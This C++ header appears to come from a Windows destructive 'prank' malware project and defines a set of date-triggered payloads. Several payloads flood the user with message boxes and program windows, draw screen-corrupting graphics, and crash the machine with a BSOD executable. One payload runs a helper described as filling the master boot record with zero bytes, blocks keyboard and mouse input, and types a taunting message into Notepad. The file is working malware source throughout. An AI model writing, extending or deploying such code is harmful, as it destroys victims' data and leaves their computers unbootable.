#ifndef PAYLOADS_H_INCLUDED
#define PAYLOADS_H_INCLUDED

#include <Windows.h>
#include <vector>
#include <string>
#include <filesystem>
#include "Inputs.h"

class Payloads
{
private:
	void pressKey(BYTE vK)
	{
		keybd_event(vK, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
		Sleep(10);
		keybd_event(vK, 0, KEYEVENTF_KEYUP | 0, 0);
	}

	void sendInput(std::string input)
	{
		keybd_event(VK_SHIFT, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
		for (char& c : input)
		{
			if (tolower(c) == 'a')
				pressKey(VK_A);
			else if (tolower(c) == 'b')
				pressKey(VK_B);
			else if (tolower(c) == 'c')
				pressKey(VK_C);
			else if (tolower(c) == 'd')
				pressKey(VK_D);
			else if (tolower(c) == 'e')
				pressKey(VK_E);
			else if (tolower(c) == 'f')
				pressKey(VK_F);
			else if (tolower(c) == 'g')
				pressKey(VK_G);
			else if (tolower(c) == 'h')
				pressKey(VK_H);
			else if (tolower(c) == 'i')
				pressKey(VK_I);
			else if (tolower(c) == 'j')
				pressKey(VK_J);
			else if (tolower(c) == 'k')
				pressKey(VK_K);
			else if (tolower(c) == 'l')
				pressKey(VK_L);
			else if (tolower(c) == 'm')
				pressKey(VK_M);
			else if (tolower(c) == 'n')
				pressKey(VK_N);
			else if (tolower(c) == 'o')
				pressKey(VK_O);
			else if (tolower(c) == 'p')
				pressKey(VK_P);
			else if (tolower(c) == 'q')
				pressKey(VK_Q);
			else if (tolower(c) == 'r')
				pressKey(VK_R);
			else if (tolower(c) == 's')
				pressKey(VK_S);
			else if (tolower(c) == 't')
				pressKey(VK_T);
			else if (tolower(c) == 'u')
				pressKey(VK_U);
			else if (tolower(c) == 'v')
				pressKey(VK_V);
			else if (tolower(c) == 'w')
				pressKey(VK_W);
			else if (tolower(c) == 'x')
				pressKey(VK_X);
			else if (tolower(c) == 'y')
				pressKey(VK_Y);
			else if (tolower(c) == 'z')
				pressKey(VK_Z);
			else if (c == ' ')
				pressKey(VK_SPACE);
			else if (c == '?')
			{
				keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP | 0, 0);
				Sleep(30);
				pressKey(VK_OEM_2);
				Sleep(30);
				keybd_event(VK_SHIFT, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
			}
			Sleep(500);
		}
		keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP | 0, 0);
	}

	void start(LPCSTR cmd)
	{
		WinExec(cmd, SW_HIDE);
	}
public:
	std::filesystem::path wallfspath = std::filesystem::absolute("mal.png"); //get wallpaper path
	std::string wallpath = wallfspath.u8string();                            //convert wallpaper path to str
	std::wstring tempwall = std::wstring(wallpath.begin(), wallpath.end());  //convert wallpaper path to wstr
	LPCWSTR tempwall2 = tempwall.c_str();                                    //convert wallpaper path to lpcwstr
	LPWSTR wall = (LPWSTR)tempwall2;                                         //convert wallpaper path to lpwstr

	Payloads()
	{
		if (std::filesystem::exists("mal.png"))
		{
			int wallresult = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wall, SPIF_UPDATEINIFILE);
		}
	}

	std::filesystem::path msg1fspath = std::filesystem::absolute("msg1.vbs");         //get msgbox path
	std::string msg1path = msg1fspath.u8string();                                     //convert msgpath to str
	std::string msg1cmd  = "C:\\Windows\\System32\\cmd.exe /c start " + msg1path;     //convert msgpath to cmd

	void payload1()
	{
		if (std::filesystem::exists("msg1.vbs"))
		{
			while (true)
			{
				Sleep(30);
				start((LPCSTR)msg1cmd.c_str());
			}
		}
	}

	std::filesystem::path bat2fspath = std::filesystem::absolute("spam2.vbs");    //get vbs file path
	std::string bat2path = bat2fspath.u8string();                                 //convert vbs file path to str
	std::string bat2cmd = "C:\\Windows\\System32\\cmd.exe /c start " + bat2path;  //convert vbs file path to cmd

	void payload2()
	{
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetDC(hwnd);
		RECT rct;

		GetWindowRect(hwnd, &rct);
		
		int x = rct.right;
		int y = rct.bottom;

		HANDLE brush;

		if (std::filesystem::exists("spam2.vbs"))
		{
			start((LPCSTR)bat2cmd.c_str());
		}

		while (true)
		{
			Sleep(10);
			brush = CreateSolidBrush(RGB(
				rand() % 255 + 1,
				rand() % 255 + 1,
				rand() % 255 + 1
			));

			SelectObject(hdc, brush);
			PatBlt(hdc, rand() % x + 1, rand() % y + 1, rand() % x + 1, rand() % x + 1, PATINVERT);
			DeleteObject(brush);
		}
	}

	void payload3()
	{
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetDC(hwnd);
		RECT rct;
		
		GetWindowRect(hwnd, &rct);

		while (true)
		{
			Sleep(400);
			StretchBlt(hdc, rct.left + 10, rct.top + 10, rct.right - 20, rct.bottom - 20, hdc, rct.left, rct.top, rct.right, rct.bottom, SRCCOPY);
		}
	}

	std::filesystem::path bsodfspath = std::filesystem::absolute("BSOD.exe");      //get bsod file path
	std::string bsodpath = bsodfspath.u8string();                                  //convert bsod file path to str
	std::string bsodcmd  = "C:\\Windows\\System32\\cmd.exe /c start " + bsodpath;  //convert bsod file path to cmd

	void payload4()
	{
		while (true)
		{
			if ((MessageBox(NULL, L"ldays.exe", L"DO YOU LIKE WINDOWS?", MB_TOPMOST | MB_YESNO | MB_ICONWARNING)) == IDYES)
			{
				if (std::filesystem::exists("BSOD.exe"))
				{
					start(bsodcmd.c_str());
				}
				break;
			}
		}
	}

	std::filesystem::path msg3fspath = std::filesystem::absolute("msg3.vbs");      //get bsod file path
	std::string msg3path = msg3fspath.u8string();                                  //convert bsod file path to str
	std::string msg3cmd = "C:\\Windows\\System32\\cmd.exe /c start " + msg3path;   //convert bsod file path to cmd

	void payload5()
	{	
		while (true)
		{
			if (std::filesystem::exists("msg3.vbs"))
			{
				Sleep(30);
				start(msg3cmd.c_str());
			}
			
			start("C:\\Windows\\System32\\cmd.exe /c start control");
			Sleep(30);
			start("C:\\Windows\\System32\\cmd.exe /c start explorer");
			Sleep(30);
			start("C:\\Windows\\System32\\cmd.exe /c start calc");
		}
	}

	std::filesystem::path bat3fspath = std::filesystem::absolute("spam3.vbs");  //get vbs file path
	std::string bat3path = bat3fspath.u8string();                               //convert vbs file path to str
	std::string bat3cmd = "C:\\Windows\\System32\\cmd.exe /c " + bat3path;      //convert vbs file path to cmd

	void payload6()
	{
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetDC(hwnd);
		RECT rct;

		GetWindowRect(hwnd, &rct);

		int x = rct.right;
		int y = rct.bottom;

		HANDLE brush;

		if (std::filesystem::exists("spam3.vbs"))
		{
			start(bat3cmd.c_str());
		}

		while (true)
		{
			Sleep(10);

			brush = CreateSolidBrush(RGB(
				rand() % 255 + 1,
				rand() % 255 + 1,
				rand() % 255 + 1
			));
			StretchBlt(hdc, rct.left + 10, rct.top + 10, rct.right - 20, rct.bottom - 20, hdc, rct.left, rct.top, rct.right, rct.bottom, SRCCOPY);
			SelectObject(hdc, brush);
			PatBlt(hdc, rand() % x + 1, rand() % y + 1, rand() % x + 1, rand() % x + 1, PATINVERT);
			DeleteObject(brush);
		}
	}

	std::filesystem::path mbrfspath = std::filesystem::absolute("mbr.exe");  //get mbr file path
	std::string mbrpath = mbrfspath.u8string();                              //convert mbr file path to str
	std::string mbrcmd = "C:\\Windows\\System32\\cmd.exe /c " + mbrpath;     //convert mbr file path to cmd

	void payload7()
	{
		if (std::filesystem::exists("mbr.exe"))
		{
			start(mbrcmd.c_str());         //fill mbr with 0 bytes
		}
		BlockInput(TRUE);                  //block mouse and keyboard input

		// change notepad font size
		HKEY hKey;
		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Notepad", 0, KEY_ALL_ACCESS, &hKey);
		DWORD value = 336;
		RegSetValueEx(hKey, TEXT("iPointSize"), 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
		RegCloseKey(hKey);
		
		Sleep(5000);
		start("C:\\Windows\\System32\\cmd.exe /c start notepad");
		Sleep(3000);

		sendInput("look");
		pressKey(VK_RETURN);
		sendInput("its dec thirdy first");
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		sendInput("what happened this year?");
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		sendInput("jan first    messagebox spam");
		pressKey(VK_RETURN);
		sendInput("apr first    messagebox spam saying   happy april fools  , while some visual effects appears");
		pressKey(VK_RETURN);
		sendInput("apr twenty first    tunnel effect on desktop");
		pressKey(VK_RETURN);
		sendInput("oct thirdy first    bsod");
		pressKey(VK_RETURN);
		sendInput("dec twenty fifth    messagebox spam while a lot of programs open");
		pressKey(VK_RETURN);
		sendInput("dec thirty    some visual effects and tunnel effect appear while a lot of programs open");
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		sendInput("but now what happens?");
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		pressKey(VK_RETURN);
		sendInput("ENJOY");
		if (std::filesystem::exists("BSOD.exe"))
		{
			start(bsodcmd.c_str());
		}
	}
};

#endif // PAYLOADS_H_INCLUDED